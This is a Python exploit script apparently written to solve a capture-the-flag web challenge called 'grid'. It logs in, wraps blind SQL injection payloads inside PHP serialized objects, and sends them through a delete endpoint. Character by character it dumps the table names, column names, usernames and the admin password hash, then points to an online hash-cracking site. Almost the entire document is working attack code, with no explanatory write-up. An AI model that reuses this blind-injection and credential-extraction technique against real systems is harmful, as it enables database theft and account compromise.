import requests, subprocess
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies={
    "http":"127.0.0.1:8080",
    "https":"127.0.0.1:8080"
}
url="https://web.ctflearn.com/grid/"
sub_url_index="index.php"
sub_url_login="controller.php?action=login"
sub_url_add_point="controller.php?action=add_point"
sub_url_remove_point="controller.php?action=delete_point&point="
result_text=""

list_wordlist=list("abcdefghijklmnopqrstuvwxyz0123456789,ABCDEFGHIJKLMNOPQRSTUVWXYZ_!@#$%^&*();")
list_wordlist.append('')

def generate_payload(payload):
    code_php = f"""\
    <?php
    class point {{
        public $x;
        public $y;
        public $ID;

        public function __construct($x, $y, $ID) {{
            $this->x = $x;
            $this->y = $y;
            $this->ID = $ID;
        }}
    }}

    $object = new point('0','0',"{payload}");
    $serialized = serialize($object);
    echo $serialized;
    """
    with open("tmp.php", "w") as php_file:
        php_file.write(code_php)

    result_pr = subprocess.run(["php","tmp.php"],text=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
    serialize = result_pr.stdout
    return serialize
def login(url,username,password):
    login_process = requests.post(url=url,data={'uname':f'{username}','pass':f'{password}'},allow_redirects=False,verify=False,proxies=proxies)
    return (login_process.cookies['PHPSESSID'])
def get(url,cookies):
    result = requests.get(url=url,cookies={'PHPSESSID':f'{cookies}'},verify=False,allow_redirects=False,proxies=proxies)
    return result.text
def add_point(url,index_x,index_y,cookies):
    result = requests.post(url=url,data={'x':f'{index_x}','y':f'{index_y}'},cookies={'PHPSESSID':f'{cookies}'},allow_redirects=False,verify=False,proxies=proxies)
    # print(result.status_code)
    if result.status_code == 302:
        return True
    return False
def remove_point(url,cookies):
    result = requests.get(url=url,cookies={'PHPSESSID':f'{cookies}'},allow_redirects=False,verify=False,proxies=proxies)
    if result.status_code == 302:
        return True
    return False

#login
cookies = login(url=url+sub_url_login,username='lelong',password='admin')

#check add point
# add_point(url=url+sub_url_add_point,index_x=0,index_y=0,cookies=cookies)

#check lenght for tables
length_of_result_table=0

index=10
while True:
    add_point(url=url+sub_url_add_point,index_x=0,index_y=0,cookies=cookies)
    serialize = generate_payload(f"1234567 OR (LENGTH((SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database() LIMIT 1 ))) = {index}").strip()
    remove_point(url=url+sub_url_remove_point+serialize,cookies=cookies)
        #get index
    result_text = get(url=url+sub_url_index,cookies=cookies)
    if "ID" in result_text:
        print(f"NOT LENGHT IS {index}")
    else: 
        length_of_result_table=index
        print(f"table is: {length_of_result_table}")
        break
    index+=1
#get tabel
result_table=""
for index in range(1,length_of_result_table+1):
    for i in list_wordlist:
        add_point(url=url+sub_url_add_point,index_x=0,index_y=0,cookies=cookies)
        serialize = generate_payload(f"1234567 OR (SUBSTRING((SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()),{index},1)) = '{i}'").strip()
        remove_point(url=url+sub_url_remove_point+serialize,cookies=cookies)
        #get index
        result_text = get(url=url+sub_url_index,cookies=cookies)
        if "ID" in result_text:
            print(f"INDEX {index} NOT {i} SERIA = {serialize}")
        else: 
            result_table+=i
            print(f"table is: {result_table}")
            break
print(result_table)
array_tables = result_table.split(",")
print(array_tables)
#get lenght colum
information_table={}
for table in array_tables:
    index=0
    while True:
        add_point(url=url+sub_url_add_point,index_x=0,index_y=0,cookies=cookies)
        serialize = generate_payload(f"1234567 OR (LENGTH((SELECT GROUP_CONCAT(COLUMN_NAME) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = '{table}'))) = {index}").strip()
        remove_point(url=url+sub_url_remove_point+serialize,cookies=cookies)
        result_text = get(url=url+sub_url_index,cookies=cookies)
        if "ID" in result_text:
            print(f"NOT LENGHT IS {index}")
        else: 
            #get colum of table
            print(f"table:{table} is column lenght: {index}")
            result_colum=""
            for i in range(1,index+1):
                for wo in list_wordlist:
                    add_point(url=url+sub_url_add_point,index_x=0,index_y=0,cookies=cookies)
                    serialize = generate_payload(f"1234567 OR (SUBSTRING((SELECT GROUP_CONCAT(COLUMN_NAME) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = '{table}'),{i},1))='{wo}'").strip()
                    remove_point(url=url+sub_url_remove_point+serialize,cookies=cookies)
                    result_text = get(url=url+sub_url_index,cookies=cookies)
                    if "ID" in result_text:
                        print(f"COLUM NOT CONTAIN {wo} SERIA = {serialize}")
                    else: 
                        result_colum+=wo
                        print(f"colum for table: {table} is: {result_colum}")
                        break
            if result_colum != "":
                information_table[table] = result_colum
            break
        index+=1
print(information_table)
# information_table={'point': 'id,point_blob,uid', 'user': 'username,password,uid'}
#cuong ep de test
array_username = (information_table['user'].split(","))
#get lenght username for table user
index=100
length_of_result_table=0
while True:
    add_point(url=url+sub_url_add_point,index_x=0,index_y=0,cookies=cookies)
    serialize = generate_payload(f"1234567 OR (LENGTH((SELECT GROUP_CONCAT({array_username[0]}) FROM user))) > {index}").strip()
    remove_point(url=url+sub_url_remove_point+serialize,cookies=cookies)
    #get ind
    result_text = get(url=url+sub_url_index,cookies=cookies)
    if "ID" in result_text:
        print(f"LENGHT OF STRING USER NOT {index} NOT SERIA = {serialize}")
    else: 
        print(f"USER TABLE LENGHT is > 100")
        break
    index+=1
#get username in table user
index=1
user_in_table=""
while True:
    for wo in list_wordlist:
        add_point(url=url+sub_url_add_point,index_x=0,index_y=0,cookies=cookies)
        serialize = generate_payload(f"1234567 OR (SUBSTRING((SELECT GROUP_CONCAT(username) FROM user),{index},1))='{wo}'").strip()
        remove_point(url=url+sub_url_remove_point+serialize,cookies=cookies)
        result_text = get(url=url+sub_url_index,cookies=cookies)
        if "ID" in result_text:
            print(f"LENGHT OF STRING USER NOT {index} NOT SERIA = {serialize}")
        else: 
            user_in_table+=wo
            print(f"USERNAME OF TABLE USER is {user_in_table}")
            break
    index+=1
    if index == 51:
        break
#get lenght passowrd for admin
index=32
while True:
    add_point(url=url+sub_url_add_point,index_x=0,index_y=0,cookies=cookies)
    serialize = generate_payload(f"1234567 OR (LENGTH((SELECT GROUP_CONCAT({array_username[1]}) FROM user WHERE {array_username[0]}='admin'))) > 100").strip()
    remove_point(url=url+sub_url_remove_point+serialize,cookies=cookies)
    #get ind
    result_text = get(url=url+sub_url_index,cookies=cookies)
    if "ID" in result_text:
        print(f"PASSWORD NOT LENGHT {index} NOT SERIA = {serialize}")
    else: 
        print(f"PASSWORD LENGHT is > 100")
        break
    index+=1
#get password for admin
password_for_admin=""
index=1
while True:
    isBreak=False
    for wo in list_wordlist:
        add_point(url=url+sub_url_add_point,index_x=0,index_y=0,cookies=cookies)
        serialize = generate_payload(f"1234567 OR (SUBSTRING((SELECT GROUP_CONCAT(password) FROM user WHERE username='admin'),{index},1))='{wo}'").strip()
        remove_point(url=url+sub_url_remove_point+serialize,cookies=cookies)
        result_text = get(url=url+sub_url_index,cookies=cookies)
        if "ID" in result_text:
            print(f"PASSWORD INDEX {index} NOT CONTAIN {wo} SERIALIZE: {serialize}")
        else: 
            if wo == ',':
                isBreak = True
                break
            password_for_admin+=wo
            print(f"USER IN TABLE USERS: {password_for_admin}")
            break
    index+=1
    if isBreak:
        break
url_crack="https://crackstation.net/"
print(f"CRACK PASSWORD: {password_for_admin} AT {url_crack}")